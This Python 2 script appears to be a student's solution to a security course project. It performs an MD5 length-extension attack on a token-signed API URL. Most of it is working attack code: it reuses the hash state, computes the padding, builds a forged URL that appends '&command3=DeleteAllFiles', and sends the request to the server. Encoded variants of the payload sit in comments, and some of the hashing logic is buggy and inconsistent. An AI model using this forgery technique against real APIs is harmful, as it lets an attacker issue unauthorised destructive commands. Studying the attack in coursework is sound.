from pymd5 import md5, padding
import httplib, urlparse, sys
import urllib

m = "Use HMAC, not hashes"
h = md5()
h.update(m)

print "\nInital message hash is:"
print h.hexdigest()
print "\n"

h = md5(state="3ecc68efa1871751ea9b0b1a5b25004d".decode("hex"), count=512)

print(len(m))

paddedLength = (len(m) + len(padding(len(m)*8)))*8
pad = padding(len(m)*8)
print(paddedLength)
addition = "Good advice"
h.update(addition)
print "\nFinal message hash is:"
print h.hexdigest()
print"Hash of message + padding + suffix is:"
newMd5 = md5()
newMd5.update(m+pad+addition)
print newMd5.hexdigest()
print"##################################################################\n\n"

url ="https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp"
# https://ecen5032.org/project1/api?token=0ac762d6f76899c04d23935668fccbf5&user=admin&command1=ListFiles&command2=NoOpXHg4MFx4MDBceDAwXHgwMFx4MDBceDk4XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMA==&command3=DeleteAllFiles
final = 'https://ecen5032.org/project1/api?token=0ac762d6f76899c04d23935668fccbf5&user=admin&command1=ListFiles&command2=NoOp\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&command3=DeleteAllFiles'
# https://ecen5032.org/project1/api?token=0ac762d6f76899c04d23935668fccbf5&user=admin&command1=ListFiles&command2=NoOpXHg4MFx4MDBceDAwXHgwMFx4MDBceDk4XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCZjb21tYW5kMz1EZWxldGVBbGxGaWxlcw0KDQo=
# https://ecen5032.org/project1/api?token=0ac762d6f76899c04d23935668fccbf5&user=adminJmNvbW1hbmQxPUxpc3RGaWxlcyZjb21tYW5kMj1Ob09wXHg4MFx4MDBceDAwXHgwMFx4MDBceDk4XHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCZjb21tYW5kMz1EZWxldGVBbGxGaWxlcw==
# https://ecen5032.org/project1/api?token=0ac762d6f76899c04d23935668fccbf5&user=YWRtaW4mY29tbWFuZDE9TGlzdEZpbGVzJmNvbW1hbmQyPU5vT3BceDgwXHgwMFx4MDBceDAwXHgwMFx4OThceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwJmNvbW1hbmQzPURlbGV0ZUFsbEZpbGVz

# find the toekn on a variable length url
location = url.index('token=')
location += 6
messageLocation = url.index('&user')
messageLength = len(url) - messageLocation
pad = padding(messageLength)*8

print("Original message length:")
print(messageLength)
print("\n")

token = ''
end = location+32
i = location

while (i < end):
    token += url[i]
    i +=1
print"Token is:"
print token
print"\nURL is:"
print url
newAddition = "&command3=DeleteAllFiles"
# pad = padding(messageLength+8+len(newAddition))

#do the hashiing

newH = md5(state=token.decode("hex"), count=512)
newH.update(pad+newAddition)
newtoken=h.hexdigest()
print"\nNew token is:"
print newtoken
print"\nPad is:"
print pad
newUrl = 'https://ecen5032.org/project1/api?token='+newtoken+'&user=admin&command1=ListFiles&command2=NoOp'+pad+'&command3=DeleteAllFiles'
url += newAddition

url = url.replace(token, newtoken)

print "\n New URL is:"
# url = urllib.quote(url)
print newUrl

# check = md5(state=token.decode("hex"), count=512)
# checkMessage = ''
# for each in range(messageLocation+5,len(url)):
#     checkMessage += url[each]
# print("\nMessage is:")
# print checkMessage
#
# check.update(checkMessage)
# #5d28a0a45dea4e9c9f702542ce5c6d48
# finalCryp = check.hexdigest()
#
# print"\n Check hash is:"
# print finalCryp

parsedUrl = urlparse.urlparse(urllib.quote(final))
# print(parsedUrl)
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print"\n Server Response:"
print conn.getresponse().read()
